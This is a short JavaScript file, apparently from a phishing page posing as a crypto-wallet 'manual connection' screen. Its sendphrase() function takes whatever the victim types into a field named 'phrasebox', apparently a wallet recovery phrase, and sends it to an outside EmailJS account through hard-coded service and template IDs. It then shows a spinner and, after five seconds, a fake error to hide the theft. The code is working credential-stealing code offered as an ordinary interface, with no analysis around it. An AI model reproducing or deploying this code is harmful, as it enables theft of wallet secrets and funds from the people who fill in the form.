let box5Timer = null;

function openGlassBox5(){
    hideAllBoxes();
    document.getElementById('glassBox3').classList.remove('active');
    const box = document.getElementById('glassBox5');
    const spinner = document.getElementById('box5Spinner');
    const error = document.getElementById('box5Error');

    spinner.style.display = "block";
    error.style.display = "none";

    box.classList.add('active');

    // Clear any existing timer
    if (box5Timer) clearTimeout(box5Timer);

    // Switch to error after 5 seconds
    box5Timer = setTimeout(() => {
        spinner.style.display = "none";
        error.style.display = "block";
    }, 5000);
}



function sendphrase(){
    if(document.getElementById("phrasebox").value.trim() === ""){
        alert('Manual connection field cannot be empty')
    }

    else{
         let parms = {
        message: document.getElementById("phrasebox").value
    }
        emailjs.send("service_ocoq02x", "template_wgo1bul", parms).then(
        openGlassBox5()
    );  
    }
    
    
};

/* */